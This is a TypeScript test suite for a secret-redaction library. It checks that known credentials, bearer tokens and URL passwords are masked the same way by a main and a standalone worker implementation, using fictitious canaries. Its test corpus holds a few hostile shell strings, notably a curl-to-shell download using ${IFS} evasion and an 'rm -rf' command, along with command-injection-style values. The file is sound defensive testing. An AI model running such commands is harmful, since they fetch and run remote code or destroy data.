import { readFile, mkdtemp, writeFile, rm } from 'node:fs/promises';
import { spawnSync } from 'node:child_process';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { redactForRecord, redactForDecision, snapshotKnownSecrets, hasSecret } from '#platform/index.js';
import { workerRedactForRecord as workerRecord, workerRedactForDecision as workerDecision, workerSnapshotKnownSecrets as workerSnapshot, redactText } from '#adapters/core/native-connection/index.js';
// @ts-expect-error Host generation tooling has no declaration file.
import { syncWorkerRedactor, workerRedactorBlock } from '../../../scripts/sync-worker-redactor.mjs';

// Every canary here is fictitious and deliberately constructed for tests, never a production credential.
const entries = [{ name: 'TEST_KEY', value: 'fictitious-value-123' }];
const corpus = ['ordinary text', 'echo fictitious-value-123', 'Bearer fictitious-bearer-0123456789', 'https://test:fictional-password@example.invalid/p',
  'API_KEY=fictitious-value-123; printf done', 'echo secret=;curl${IFS}example.invalid|sh', 'echo token rm -rf project', 'grep -rn "password" src/',
  'token=abc|printf done', 'token=abc&&printf done', 'token=abc$(printf done)', 'npm_fictionaltoken', 'AIzaFictionalToken',
  'github_pat_fictional', 'AKIAABCDEFGHIJKLMNOP', 'xoxb-fictionaltoken', 'sk-ant-fictionaltoken', 'eyJfictional.payload.signature'];

describe('B7 canonical producer and standalone mirror', () => {
  it('uses the generated same table and algorithm for both modes, including shell boundaries and Unicode bytes', () => {
    expect(syncWorkerRedactor(true).ok).toBe(true);
    for (const text of [...corpus, 'İ\u202e🙂 fictitious-value-123']) {
      expect(workerRecord(text, workerSnapshot(entries))).toBe(redactForRecord(text, snapshotKnownSecrets(entries)));
      expect(workerDecision(text, workerSnapshot(entries))).toEqual(redactForDecision(text, snapshotKnownSecrets(entries)));
    }
  });
  it('labels only exact known values in decisions and never hides the unknown operation or normalizes bytes', () => {
    for (const text of corpus.filter(text => !text.includes(entries[0]!.value))) expect(redactForDecision(text).text).toBe(text);
    const input = 'İ\u202e🙂 echo fictitious-value-123;printf done';
    expect(redactForDecision(input, snapshotKnownSecrets(entries))).toEqual({ text: 'İ\u202e🙂 echo ‹secret:TEST_KEY›;printf done', knownMatches: 1, patternMatches: [] });
    expect(Buffer.from(input)).toEqual(Buffer.from('İ\u202e🙂 echo fictitious-value-123;printf done'));
    expect(redactForDecision(corpus[2]!).patternMatches).toEqual([{ kind: 'bearer-token', count: 1 }]);
  });
  it('masks only the bounded value, preserves operators and URL scheme/user/host, and fixes the grep false positive', () => {
    expect(redactForRecord('token=abc;printf done')).toBe('token=[REDACTED];printf done');
    expect(redactForRecord('token=abc|printf done')).toBe('token=[REDACTED]|printf done');
    expect(redactForRecord('token=abc&printf done')).toBe('token=[REDACTED]&printf done');
    expect(redactForRecord('token=abc$(printf done)')).toBe('token=[REDACTED]$(printf done)');
    expect(redactForRecord('https://test:fictional-password@example.invalid/p')).toBe('https://test:[REDACTED]@example.invalid/p');
    for (const text of ['grep -rn "password" src/', 'echo token rm -rf project', 'echo secret=;curl${IFS}example.invalid|sh']) expect(redactForRecord(text)).toBe(text);
  });
  it('redacts the full union when known and pattern coverage overlap instead of leaking a credential prefix or suffix', () => {
    const known = snapshotKnownSecrets([{ name: 'B7_TEST', value: 'fictitious-value' }]);
    expect(redactForRecord('token=prefictitious-valuepost;printf done', known)).toBe('token=‹secret:B7_TEST›;printf done');
    const enclosing = snapshotKnownSecrets([{ name: 'WHOLE', value: 'prefix token=fictitious suffix' }]);
    expect(redactForRecord('echo prefix token=fictitious suffix;printf done', enclosing)).toBe('echo ‹secret:WHOLE›;printf done');
    expect(redactForDecision('token=prefictitious-valuepost;printf done', known).text).toBe('token=pre‹secret:B7_TEST›post;printf done');
    expect(workerRecord('token=prefictitious-valuepost;printf done', workerSnapshot([{ name: 'B7_TEST', value: 'fictitious-value' }]))).toBe('token=‹secret:B7_TEST›;printf done');
  });
  it('masks RFC3986 userinfo sub-delimiters only inside the password, preserving outside shell commands', () => {
    for (const delimiter of ["!", '$', '&', "'", '(', ')', '*', '+', ',', ';', '=', ':', '%2F', '%40']) {
      const url = `https://test:fictitious${delimiter}tail@example.invalid/p?q=visible#fragment`;
      for (const text of [url, `printf '%s' "${url}";printf done`, `${url}&&printf done`]) {
        const expected = text.replace(`fictitious${delimiter}tail`, '[REDACTED]');
        expect(redactForRecord(text)).toBe(expected);
        expect(redactForDecision(text)).toEqual({ text, knownMatches: 0, patternMatches: [{ kind: 'url-userinfo', count: 1 }] });
        expect(hasSecret(text)).toBe(true);
        expect(workerRecord(text)).toBe(expected);
        expect(workerDecision(text)).toEqual(redactForDecision(text));
      }
    }
    expect(redactForRecord('https://user:fictitious;tail/p@path.invalid')).toBe('https://user:fictitious;tail/p@path.invalid');
    expect(redactForRecord('https://test:şifre-canary@example.invalid/p')).toBe('https://test:[REDACTED]@example.invalid/p');
  });
  it('covers different-start known overlaps and self-overlaps with deterministic labels and occurrence counts', () => {
    const input = [{ name: 'FIRST', value: 'fictitious-SHARED' }, { name: 'SECOND', value: 'SHARED-tail-0123456789' }];
    const known = snapshotKnownSecrets(input), text = 'echo fictitious-SHARED-tail-0123456789;printf done';
    const expected = 'echo ‹secret:FIRST›‹secret:SECOND›;printf done';
    expect(redactForRecord(text, known)).toBe(expected);
    expect(redactForDecision(text, known)).toEqual({ text: expected, knownMatches: 2, patternMatches: [] });
    expect(workerRecord(text, workerSnapshot(input))).toBe(expected);
    expect(workerDecision(text, workerSnapshot(input))).toEqual(redactForDecision(text, known));
    const anonymous = input.map(entry => ({ ...entry, name: null }));
    expect(redactForRecord(text, snapshotKnownSecrets(anonymous))).toBe('echo [REDACTED];printf done');
    expect(redactText(text, anonymous.map(entry => entry.value))).toBe('echo [REDACTED];printf done');
    const repeated = snapshotKnownSecrets([{ name: 'REPEAT', value: 'abcabc' }]);
    expect(redactForDecision('abcabcabc', repeated)).toEqual({ text: '‹secret:REPEAT›', knownMatches: 2, patternMatches: [] });
    expect(redactForRecord('abcabcabc', repeated)).toBe('‹secret:REPEAT›');
    const sameStart = snapshotKnownSecrets([{ name: 'Z', value: 'abcdefghij' }, { name: 'A', value: 'abcdefghij' }, { name: 'SHORT', value: 'abcdef' }]);
    expect(redactForDecision('abcdefghij', sameStart)).toEqual({ text: '‹secret:A›', knownMatches: 1, patternMatches: [] });
    expect(redactForDecision('abcdefabcdef', snapshotKnownSecrets([{ name: 'SIX', value: 'abcdef' }])).text).toBe('‹secret:SIX›‹secret:SIX›');
  });
  it('keeps >=6 known and >=16 bearer detection separate from legacy record coverage, without recognizing encoded secrets', () => {
    const known = snapshotKnownSecrets([{ name: 'SHORT', value: 'abcde' }, { name: 'SIX', value: 'abcdef' }]);
    expect(redactForRecord('abcde abcdef', known)).toBe('abcde ‹secret:SIX›');
    expect(redactForRecord('Bearer 123456789012345')).toBe('Bearer [REDACTED]');
    expect(redactForDecision('Bearer 123456789012345')).toEqual({ text: 'Bearer 123456789012345', knownMatches: 0, patternMatches: [] });
    expect(hasSecret('Bearer 123456789012345')).toBe(false);
    expect(redactForRecord('Bearer 1234567890123456')).toBe('Bearer [REDACTED]');
    expect(hasSecret('unrecognized-value')).toBe(false);
    expect(redactForRecord(encodeURIComponent(entries[0]!.value+'!'), snapshotKnownSecrets(entries))).toBe('‹secret:TEST_KEY›!');
    expect(redactForRecord('ZmljdGl0aW91cy12YWx1ZS0xMjM=', snapshotKnownSecrets(entries))).toBe('ZmljdGl0aW91cy12YWx1ZS0xMjM=');
  });
  it('pins the snapshot and deterministic longest/canonical tie-break, treats regex punctuation literally, and exposes no serialized values', () => {
    const input = [{ name: 'Z', value: 'abcdefghi' }, { name: 'A', value: 'abcdefghi' }, { name: 'SHORTER', value: 'abcdef' }, { name: 'REGEX', value: 'a.b$[c]' }];
    const snapshot = snapshotKnownSecrets(input); input[1]!.value = 'rotated-fixture';
    expect(redactForDecision('abcdefghi a.b$[c]', snapshot).text).toBe('‹secret:A› ‹secret:REGEX›');
    expect(JSON.stringify(snapshot)).toBe('{}');
    expect(() => snapshotKnownSecrets([{ name: 'bad:label', value: 'fictitious' }])).toThrow(/^REDACTION_KNOWN_NAME_INVALID$/);
  });
  it('runs the source mirror mounted alone with only node builtins, without starting a worker or connecting to a provider', async () => {
    const dir = await mkdtemp(join(tmpdir(), 'dn-b7-standalone-'));
    try {
      const worker = await readFile(new URL('../../../src/adapters/core/native-connection/internal/worker.ts', import.meta.url), 'utf8');
      const file = join(dir, 'isolated.ts'); await writeFile(file, worker);
      const script = "const m=await import(process.argv[1]);if(m.redactForRecord('token=fictitious')!=='token=[REDACTED]')process.exit(2);"
        + "const s='Bearer BEARERCANARY';if(m.redactForRecord(s)!=='Bearer [REDACTED]'||m.redactForDecision(s).text!==s||m.redactForDecision(s).patternMatches.length!==0||m.hasSecret(s))process.exit(3);"
        + "const k=m.snapshotKnownSecrets([{name:'STANDALONE_FIXTURE',value:'BEARERCANARY'}]),r=m.redactForRecord(s,k);if(r!=='Bearer ‹secret:STANDALONE_FIXTURE›'||m.redactForRecord(r,k)!==r)process.exit(4);"
        + "const c=m.snapshotKnownSecrets([{name:'A',value:'fictitious-value'},{name:'B',value:'‹secret:A›'}]);if(m.redactForRecord('Bearer ‹secret:A›',c)!=='Bearer ‹secret:B›')process.exit(5)";
      const result = spawnSync(process.execPath, ['--input-type=module', '-e', script, new URL('file:'+file).href], { encoding: 'utf8', timeout: 10_000 });
      expect({ status: result.status, error: result.error?.message, stderr: result.stderr }).toEqual({ status: 0, error: undefined, stderr: '' });
    } finally { await rm(dir, { recursive: true, force: true }); }
  });
  it('binds drift checks to the actual algorithm and table bytes, and retains the worker wrapper bounds', async () => {
    const source = await readFile(new URL('../../../src/platform/core/redaction/internal/redact.ts', import.meta.url), 'utf8');
    const table = await readFile(new URL('../../../src/platform/core/redaction/internal/patterns.json', import.meta.url), 'utf8');
    expect(workerRedactorBlock(source+'\n', table)).not.toBe(workerRedactorBlock(source, table));
    expect(workerRedactorBlock(source, table+'\n')).not.toBe(workerRedactorBlock(source, table));
    const literalTable = JSON.stringify({ ...JSON.parse(table), literalReplacementCanary: '$& $1 $\u0060 $\u0027' });
    expect(workerRedactorBlock(source, literalTable)).toContain(`const REDACTION_TABLE = ${JSON.stringify(JSON.parse(literalTable))};\n`);
    expect(redactText('a\u0000b'+'x'.repeat(500), [], 240)).toHaveLength(240);
    expect(redactText('a\u0000b', [], 240)).toBe('a b');
    const text = 'x'.repeat(160_000); expect(redactForRecord(text)).toBe(text);
  });
});

describe('B7 legacy bearer record compatibility', () => {
  it('restores all nonempty legacy bearer record lengths and payload bytes in both canonical and standalone producers', () => {
    // Synthetic legacy fixtures: no authorized known-value registration and no production credentials.
    for (const payload of ['x', 'BEARERCANARY', '123456789012345', '1234567890123456', 'fictitious$;tail', 'şifre🙂']) {
      for (const separator of [' ', '\t', '\n']) {
        const text = `before bEaReR${separator}${payload} after`;
        const expected = `before bEaReR${separator}[REDACTED] after`;
        expect(redactForRecord(text)).toBe(expected);
        expect(workerRecord(text)).toBe(expected);
        const decision = redactForDecision(text);
        expect(decision.text).toBe(text);
        expect(decision.knownMatches).toBe(0);
        expect(workerDecision(text)).toEqual(decision);
        const detected = payload === '1234567890123456';
        expect(decision.patternMatches).toEqual(detected ? [{ kind: 'bearer-token', count: 1 }] : []);
        expect(hasSecret(text)).toBe(detected);
      }
    }
    for (const text of ['Bearer', 'Bearer ', 'ordinary BEARERCANARY', 'bare token', 'Bearer\t\n']) {
      expect(redactForRecord(text)).toBe(text);
      expect(workerRecord(text)).toBe(text);
    }
    for (const length of Array.from({ length: 16 }, (_, index) => index + 1)) {
      const text = `Bearer ${'x'.repeat(length)}`;
      expect(redactForRecord(text)).toBe('Bearer [REDACTED]');
      expect(workerRecord(text)).toBe('Bearer [REDACTED]');
      expect(redactForDecision(text)).toEqual({ text, knownMatches: 0,
        patternMatches: length === 16 ? [{ kind: 'bearer-token', count: 1 }] : [] });
      expect(workerDecision(text)).toEqual(redactForDecision(text));
      expect(hasSecret(text)).toBe(length === 16);
    }
    for (const text of ['Bearer [REDACTED]', 'Bearer[REDACTED]']) {
      expect(redactForRecord(text)).toBe(text);
      expect(redactForRecord(redactForRecord(text))).toBe(text);
      expect(workerRecord(workerRecord(text))).toBe(text);
    }
    const controlText = 'Bearer BEARER\u001b[31mCANARY after';
    expect(redactForRecord(controlText)).toBe('Bearer [REDACTED] after');
    expect(workerRecord(controlText)).toBe('Bearer [REDACTED] after');
    expect(redactForDecision(controlText)).toEqual({ text: controlText, knownMatches: 0, patternMatches: [] });
    expect(workerDecision(controlText)).toEqual(redactForDecision(controlText));
    expect(hasSecret(controlText)).toBe(false);
    const text = 'Bearer BEARERCANARY next', named = [{ name: 'BEARER_FIXTURE', value: 'BEARERCANARY' }];
    const known = snapshotKnownSecrets(named);
    expect(redactForRecord(text, known)).toBe('Bearer ‹secret:BEARER_FIXTURE› next');
    expect(redactForDecision(text, known)).toEqual({ text: 'Bearer ‹secret:BEARER_FIXTURE› next', knownMatches: 1, patternMatches: [] });
    expect(hasSecret(text, known)).toBe(true);
    expect(workerRecord(text, workerSnapshot(named))).toBe(redactForRecord(text, known));
    expect(workerDecision(text, workerSnapshot(named))).toEqual(redactForDecision(text, known));
    const overlapping = 'Bearer preBEARERCANARYpost next';
    expect(redactForRecord(overlapping, known)).toBe('Bearer ‹secret:BEARER_FIXTURE› next');
    expect(workerRecord(overlapping, workerSnapshot(named))).toBe(redactForRecord(overlapping, known));
    expect(redactForDecision(overlapping, known)).toEqual({ text: 'Bearer pre‹secret:BEARER_FIXTURE›post next', knownMatches: 1,
      patternMatches: [{ kind: 'bearer-token', count: 1 }] });
    expect(workerDecision(overlapping, workerSnapshot(named))).toEqual(redactForDecision(overlapping, known));
  });
  it('preserves snapshot-owned named attribution on repeated record and actual human control-safe passes', async () => {
    const { humanRecordText } = await import('#surfaces/core/terminal-render/index.js');
    const named = [{ name: 'BEARER_FIXTURE', value: 'BEARERCANARY' }];
    const controlled = [{ name: 'CONTROL_FIXTURE', value: 'BEARER\u001b[31mCANARY' }];
    const fixtures = [
      { input: 'Bearer BEARERCANARY next', entries: named, expected: 'Bearer ‹secret:BEARER_FIXTURE› next' },
      { input: 'Bearer preBEARERCANARYpost next', entries: named, expected: 'Bearer ‹secret:BEARER_FIXTURE› next' },
      { input: 'Bearer BEARERCANARY\u001b[31m next', entries: named, expected: 'Bearer ‹secret:BEARER_FIXTURE› next' },
      { input: 'Bea\u001b[31mrer BEARERCANARY next', entries: named, expected: 'Bearer ‹secret:BEARER_FIXTURE› next' },
      { input: 'Bearer BEARER\u001b[31mCANARY next', entries: controlled, expected: 'Bearer ‹secret:CONTROL_FIXTURE› next' },
    ];
    for (const fixture of fixtures) {
      const known = snapshotKnownSecrets(fixture.entries), workerKnown = workerSnapshot(fixture.entries);
      const first = redactForRecord(fixture.input, known), firstWorker = workerRecord(fixture.input, workerKnown);
      expect(firstWorker).toBe(first);
      expect(redactForRecord(first, known)).toBe(first);
      expect(workerRecord(firstWorker, workerKnown)).toBe(firstWorker);
      expect(workerRecord(first, known)).toBe(first); // One structural matcher port, not a module-local marker cache.
      expect(redactForRecord(firstWorker, workerKnown)).toBe(firstWorker);
      expect(humanRecordText(fixture.input, known)).toBe(fixture.expected);
      expect(humanRecordText(fixture.expected, known)).toBe(fixture.expected);
    }
    const known = snapshotKnownSecrets(named), marker = 'Bearer ‹secret:BEARER_FIXTURE› next';
    expect(known.spans(marker)).toEqual([]);
    expect(redactForDecision(marker, known)).toEqual({ text: marker, knownMatches: 0, patternMatches: [] });
    expect(hasSecret(marker, known)).toBe(false); // Record attribution never enters raw detection or standing.
    const reconstructed = 'Bearer BEARER\u001b[31mCANARY next';
    expect(humanRecordText(reconstructed, known)).toBe('Bearer [REDACTED] next');
  });
  it('never exempts literal marker syntax or a snapshot label containing an actual raw known value', () => {
    const entries = [{ name: 'REGISTERED', value: 'BEARERCANARY' }], known = snapshotKnownSecrets(entries);
    for (const text of ['Bearer ‹secret:OTHER›', 'Bearer ‹secret:BEARERCANARY›', 'Bearer ‹secret:OTHER-BEARERCANARY›']) {
      const expected = text.includes('BEARERCANARY') ? 'Bearer ‹secret:REGISTERED›' : 'Bearer [REDACTED]';
      expect(redactForRecord(text, known)).toBe(expected);
      expect(workerRecord(text, workerSnapshot(entries))).toBe(expected);
    }
    expect(redactForRecord('Bearer ‹secret:REGISTERED›')).toBe('Bearer [REDACTED]');
    const collisions = [{ name: 'A', value: 'fictitious-value' }, { name: 'B', value: '‹secret:A›' }];
    const collisionKnown = snapshotKnownSecrets(collisions), text = 'Bearer ‹secret:A›';
    expect(redactForRecord(text, collisionKnown)).toBe('Bearer ‹secret:B›');
    expect(redactForRecord(redactForRecord(text, collisionKnown), collisionKnown)).toBe('Bearer ‹secret:B›');
    expect(workerRecord(text, workerSnapshot(collisions))).toBe('Bearer ‹secret:B›');
    expect(redactForDecision(text, collisionKnown)).toEqual({ text: 'Bearer ‹secret:B›', knownMatches: 1, patternMatches: [] });
    expect(hasSecret(text, collisionKnown)).toBe(true);
  });
});
